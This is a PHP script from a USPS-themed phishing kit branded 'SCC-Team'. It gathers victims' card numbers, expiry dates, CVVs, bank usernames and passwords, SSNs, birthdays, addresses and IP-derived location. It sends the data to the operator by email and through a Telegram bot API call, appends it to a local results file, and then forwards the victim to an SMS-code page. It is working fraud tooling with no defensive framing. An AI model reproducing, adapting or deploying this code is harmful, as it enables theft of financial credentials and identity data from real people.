<?php
/*
  ██████     ▄████▄      ▄████▄        ▄▄▄█████▓   ▓█████     ▄▄▄       ███▄ ▄███▓
▒██    ▒    ▒██▀ ▀█     ▒██▀ ▀█        ▓  ██▒ ▓▒   ▓█   ▀    ▒████▄    ▓██▒▀█▀ ██▒
░ ▓██▄      ▒▓█    ▄    ▒▓█    ▄       ▒ ▓██░ ▒░   ▒███      ▒██  ▀█▄  ▓██    ▓██░
  ▒   ██▒   ▒▓▓▄ ▄██▒   ▒▓▓▄ ▄██▒      ░ ▓██▓ ░    ▒▓█  ▄    ░██▄▄▄▄██ ▒██    ▒██ 
▒██████▒▒   ▒ ▓███▀ ░   ▒ ▓███▀ ░        ▒██▒ ░    ░▒████▒    ▓█   ▓██▒▒██▒   ░██▒
▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░   ░ ░▒ ▒  ░        ▒ ░░      ░░ ▒░ ░    ▒▒   ▓▒█░░ ▒░   ░  ░
░ ░▒  ░ ░     ░  ▒        ░  ▒             ░        ░ ░  ░     ▒   ▒▒ ░░  ░      ░
░  ░  ░     ░           ░                ░            ░        ░   ▒   ░      ░   
      ░     ░ ░         ░ ░                           ░  ░         ░  ░       ░   
            ░           ░                                                         
*/
error_reporting(0);
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php"; 
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$hostname = gethostbyaddr($ip);


$_SESSION['username'] = $_POST['username'];
$_SESSION['password1'] = $_POST['password1'];

$InfoDATE = date("d-m-Y h:i:sa");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";


$message = "[========== [+] ♠️ ⚡ SCC-Team USPS RZLT(Info) ⚡ ♠️ [+]==========]\r\n";
$message .= "[========== [+] ♠️ ⚡ Card Inf0 ⚡ ♠️ [+]==========]\r\n";
$message .= "|Full Name 		 : ". $_SESSION["fullname"]."\r\n";
$message .= "|Card      	 : ".$_SESSION['ccnumb']."\r\n";
$message .= "|Exp                : ".$_SESSION['expr']."\r\n";
$message .= "|Cvv       	 : ".$_SESSION['cvvz']."\r\n";
$message .= "|Bank Name          : ".$_SESSION['bank_name']."\r\n";
$message .= "|Bank Scheme          : ".$_SESSION['bank_scheme']."\r\n";
$message .= "|Card Type       	 : ".$_SESSION['bank_type']."\r\n";
$message .= "|Card Brand       	 : ".$_SESSION['bank_brand']."\r\n";
$message .= "|Card Country       	 : ".$_SESSION['bank_country']."\r\n";
$message .= "[========== [+] ♠️ ⚡ Bank Log INFO ⚡ ♠️ [+]==========]\r\n";
$message .= "|Bank Name          : ".$_SESSION['bank_name']."\r\n";
$message .= "|Bank ID user          : ".$_SESSION['username']."\r\n";
$message .= "|Bank Password          : ".$_SESSION['password1']."\r\n";
$message .= "[========== [+] ♠️ ⚡ Billing INFO ⚡ ♠️ [+]==========]\r\n";
$message .= "|Full Name      : ". $_SESSION["fullname"]."\r\n";
$message .= "|Adress 1      : ". $_SESSION["add1"]."\r\n";
$message .= "|Adress 2      : ". $_SESSION["add2"]."\r\n";
$message .= "|City      : ". $_SESSION["city"]."\r\n";
$message .= "|State      : ". $_SESSION["sstate"]."\r\n";
$message .= "|zip      : ". $_SESSION["zipp"]."\r\n";
$message .= "|Phone      : ". $_SESSION["phonee"]."\r\n";
$message .= "|Birthday      : ". $_SESSION["birthday"]."\r\n";
$message .= "|SSN      : ". $_SESSION["ssn"]."\r\n";
$message .= "[========== [+] ♠️ ⚡ IP INFO ⚡ ♠️ [+]==========]\r\n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "|UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "|Time  :  ".$InfoDATE."\n";
$message .= "[========== [+] ♠️ ⚡ SCC-Team USPS RZLT(Info) ⚡ ♠️ [+]==========]\r\n";
$_SESSION['message'] = $message;
$send = $email; 
$subject = "♠️ (".$_SESSION["name"].") CVV USPS RZLT ♠️ $ip";
$headers = "From: SCC-Team USPS<info@sccteam.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../USPS_SCC_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);

HEADER("Location: ../sms1.php");

?>
